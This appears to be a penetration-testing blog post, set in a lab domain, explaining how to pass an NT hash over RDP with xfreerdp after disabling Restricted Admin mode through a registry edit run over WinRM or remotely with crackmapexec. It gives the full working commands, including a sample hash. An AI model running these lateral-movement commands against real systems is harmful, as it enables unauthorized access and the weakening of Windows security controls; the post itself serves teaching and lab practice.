---
layout: post
title:  "Passing the hash through RDP"
date:   2023-08-17 00:00:00 -0400
desc: >
    Where I explain how you can use xfreerdp to pass the hash
---

# Scenario
You've obtained local access to a machine and you have the hash for another user that has an account on a different machine, but you're not able to crack it. 
Maybe you don't have access via winrm or maybe you need GUI access so that you can bypass UAC. If RDP is running, you may be able to pass the hash with xfreerdp.
Note that this approach requires modifying the Windows registry (typically this means the user needs to be Administrator).

For this example, I'll be using the Kanto domain which is made up of two machines. A regular host named Pallet and a domain controller named DC01. There are two users on this domain as well; Oak who
is a local admin to Pallet and Ash who is the domain admin.

![The Kanto domain](/images/2023-08-17/layout.jpg "The Kanto domain")

For this example I've gained access to Pallet, dumped the hashes, and acquired the hash for ash. 

![The hash for ash](/images/2023-08-17/ashHash.png "Ashes hash")

# Passing the hash with xfreerdp

To access the remote machine with the hash, you can replace the relevant arguments and run the following command. I'm running this command through an http tunnel so I have to prepend it with "proxychains" as well. 

```bash
proxychains xfreerdp /u:ash /v:192.168.150.130 /pth:7659003efbb9d6ac24d4c775cc49ae72
```

Initially the command appears to work, but when you gain access you'll be met with the following screen.

![Blocked](/images/2023-08-17/blocked.png "Blocked")

# Understanding restricted admin mode

This message indicates that my attempt to RDP was blocked due to something called *restricted admin mode*. Restricted admin mode was initially introduced in Windows 8.1/Server 2012 R2 to try to mitigate pass-the-hash attacks by 
preventing RDP users' credentials from being stored in memory when they log in. This prevents users from having their creds read out of memory if the host that they're logging in to is compromised, but to implement this 
RDP uses network logons rather than interactive logons This allows a malicious actor to use an NT Hash or Kerberos ticket to authenticate. Ironically, by blocking one attack vector Microsoft facilitated the problem that 
facilitated another. You can now pass the hash via RDP as long as you can disable restricted admin.

# Disabling restricted admin
To disable restricted admin, you have several options. Plan A is to do it through winrm by modifying the registry with the following command:

```powershell
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

I'll break this command down. 

`reg add` - used to add a new registry key or modify an existing one

`HKLM\System\CurrentControlSet\Control\Lsa` - the path to the registry key that you want to modify. In this case, it's the lsa (local security authority)

`/t REG_DWORD` - the data type of the value that you want to set

`/v` - the name of the value that you want to set or modify. In this case, DisableRestrictedAdmin

`/d` - the data that you want to set for the value. In this case it's hex 0

`/f` - forces the operation to complete without prompting for confirmation

This works great if you have winrm access, but what if the service is disabled or you're blocked by a firewall or...? Then you have to fall back to plan B. If you have SMB access you may be able to set the 
registry value via crackmapexec. You can check SMB access by running something like the command below.

```bash
proxychains crackmapexec smb 192.168.150.130 -u 'ash' -H '7659003efbb9d6ac24d4c775cc49ae72' -d kanto.local
```

![CME SMB](/images/2023-08-17/pwned.png "pwn3d")

The (Pwn3d!) message indicates that I have SMB access, so I can try to run the following command to modify the registry remotely.

```bash
proxychains crackmapexec smb 192.168.150.130 -u 'ash' -H '7659003efbb9d6ac24d4c775cc49ae72' -d kanto.local -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
```

The -x flag allows you to specify a command to execute. In this case, it worked and I was able to access the target machine via RDP after running it.

![Done](/images/2023-08-17/done.png "Done")

# TDLR;
You can pass the hash through RDP if you're able to modify the registry on the targeted machine.



